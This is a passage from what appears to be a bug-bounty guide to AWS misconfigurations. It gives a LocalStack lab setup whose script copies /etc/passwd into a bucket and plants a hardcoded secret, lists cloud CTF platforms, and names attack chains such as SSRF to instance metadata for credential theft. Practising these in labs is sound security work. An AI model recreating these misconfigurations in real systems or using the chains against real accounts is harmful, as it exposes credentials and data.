- **Lateral movement possible** -- the stolen role credentials can access other AWS services
- **Trivial to exploit** -- single HTTP request, no special tools needed

On most bug bounty platforms, SSRF to AWS credential theft consistently pays in the $5,000 - $50,000+ range depending on the program and the blast radius of the stolen credentials.

---

## Lab Setup Ideas

### Local AWS Security Lab with LocalStack

```bash
# docker-compose.yml for a vulnerable AWS lab
cat << 'EOF' > docker-compose.yml
version: '3.8'
services:
  localstack:
    image: localstack/localstack:latest
    ports:
      - "4566:4566"
    environment:
      - SERVICES=s3,iam,lambda,sqs,sns,secretsmanager,ssm
      - DEFAULT_REGION=us-east-1
    volumes:
      - ./localstack-data:/var/lib/localstack

  vulnerable-app:
    build: ./vuln-app
    ports:
      - "3000:3000"
    environment:
      - AWS_ENDPOINT=http://localstack:4566
      - AWS_ACCESS_KEY_ID=test
      - AWS_SECRET_ACCESS_KEY=test
      - AWS_REGION=us-east-1
EOF

# Setup script to create misconfigured resources
cat << 'SETUP' > setup.sh
#!/bin/bash
export AWS_ENDPOINT_URL=http://localhost:4566
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1

# Create a public S3 bucket
aws --endpoint-url=$AWS_ENDPOINT_URL s3 mb s3://company-backup
aws --endpoint-url=$AWS_ENDPOINT_URL s3 cp /etc/passwd s3://company-backup/secrets/passwords.txt

# Create secrets
aws --endpoint-url=$AWS_ENDPOINT_URL secretsmanager create-secret \
  --name prod/database \
  --secret-string '{"host":"db.internal","password":"SuperSecret123!"}'

# Create SQS queue
aws --endpoint-url=$AWS_ENDPOINT_URL sqs create-queue --queue-name orders
SETUP
chmod +x setup.sh
```

### AWS-Specific CTF Platforms

- **CloudGoat** (Rhino Security Labs) -- Terraform-based vulnerable AWS scenarios
- **flAWS.cloud** and **flAWS2.cloud** -- Progressive AWS security challenges
- **DVCA** (Damn Vulnerable Cloud Application) -- Purpose-built vulnerable cloud app
- **SadCloud** -- Terraform configurations for common misconfigurations

```bash
# Deploy CloudGoat for hands-on practice
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip install -r requirements.txt
python cloudgoat.py config profile
python cloudgoat.py create iam_privesc_by_rollback
# Follow the scenario instructions to practice real attack chains
```

---

## Conclusion

AWS misconfigurations are among the highest-paying and most impactful findings in bug bounty. The attack surface is vast: from S3 buckets with public write access to SSRF-to-credential-theft chains that compromise entire accounts. The techniques in this guide -- SSRF to metadata, IAM policy abuse, Cognito attribute manipulation, Lambda URL exploitation, and the rest -- represent the real-world attack paths that security researchers use to find critical vulnerabilities.

The key takeaway: always enumerate the AWS footprint of your target. Check client-side JavaScript for AWS resource identifiers. Test every URL-fetching feature for SSRF to the metadata endpoint. Validate any credentials you find. Map out the blast radius before reporting.

AWS security is a deep field, and the organizations running on it are still making the same fundamental mistakes. That is your opportunity.

---

**Start hunting.** Set up CloudGoat, practice the attack chains in this guide, and then apply them to real programs. The biggest bounties in cloud security go to researchers who understand the full chain -- from initial access to maximum impact. Build that skill methodically, and the payouts will follow.
